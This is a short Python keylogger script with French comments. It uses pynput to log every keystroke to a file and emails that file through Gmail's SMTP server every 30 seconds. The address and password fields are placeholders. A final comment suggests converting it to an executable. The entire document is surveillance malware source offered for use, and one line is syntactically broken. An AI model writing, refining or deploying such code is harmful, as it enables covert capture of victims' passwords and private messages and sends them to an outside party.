
#coding:utf-8

"""----------------------------------------"""


from os import system
from pynput.keyboard import Listener
import threading
import smtplib
from email.mime.multipart import * #MIMEMultipart
from email.mime.text import * #MIMEText

#importations des modules complémentaires


"""----------------------------------------"""



def write_to_file(key):
	
	letter=str(key)
	print(letter)
	with open('logs.txt', 'a') as log:
		log.write(letter) 
		
#Création d'une fontion qui va sauvegarder les frappes de claviers dans un fichier 'logs.txt
#Tous sa grâce à l'iade du parametre 'key'(prédéfinis dans pynput) letter est égale à key convertis en string 
	
	
	"""----------------------------------------"""
	
	
def mail():
	
	msg = MIMEMultipart()
	msg['From'] = '@gmail.com'
	msg['To'] = '@gmail.com'
	msg['Subject'] = 'Keylogger'
	message = 'Keylogger'
	filename = "logs.txt"
	msg.attach(MIMEText(open(filename).read()))#permet d'envoyer le fichier logs.txt
	msg.attach(MIMEText(message))
	mailserver = smtplib.SMTP('smtp.gmail.com', 587) #utilisation du protocole smtp
	mailserver.ehlo()
	mailserver.starttls()#sécurisé en tls
	mailserver.ehlo()
	mailserver.login('@gmail.com', 'password')
	mailserver.sendmail('@gmail.com', '@gmail.com',msg.as_string())
	mailserver.quit()#quit la boite mail
	
#Cette fonction va evoyez un mail avec un message ainsi qu'un fichier texte
#Il sagit du fichier 'logs.txt' qui contients les frappes des claviers enregistrer avec le parametre key


	timer = threading.Timer(30,mail"""pour lancer la fonction mail toutes les 30 sec""")
	timer.start()#On lance la fonction"""
	
#Ici on fais du threading, toutes les 30 sec cette fonction va se declancher en paralelle de 
#la fonction write_to_file(qui enregistre les frappes de claviers)


"""----------------------------------------"""


with Listener(on_press=write_to_file) as l:#ouvre la variable 'l' en lui donnant(with) un parametre
	mail()
	l.join()
	
#ouvrir les variables avec le parametre 'Listener'(prédéfinis avec pynput) pour éviter les problemes 
#j'attribue whrite_to_file a une autre variable on_press(maintenant la fonction est égale a une variable 
#qui va etre utilisé par la suite par le parametre Listener
#Tous cela va etre va etresauvegarder dans une variable 'l'
#on demande a la variable 'l' de se lancer, puis on répète à l'infini la variable 'l'
#PLus qu'a convertir en exe !


"""----------------------------------------"""
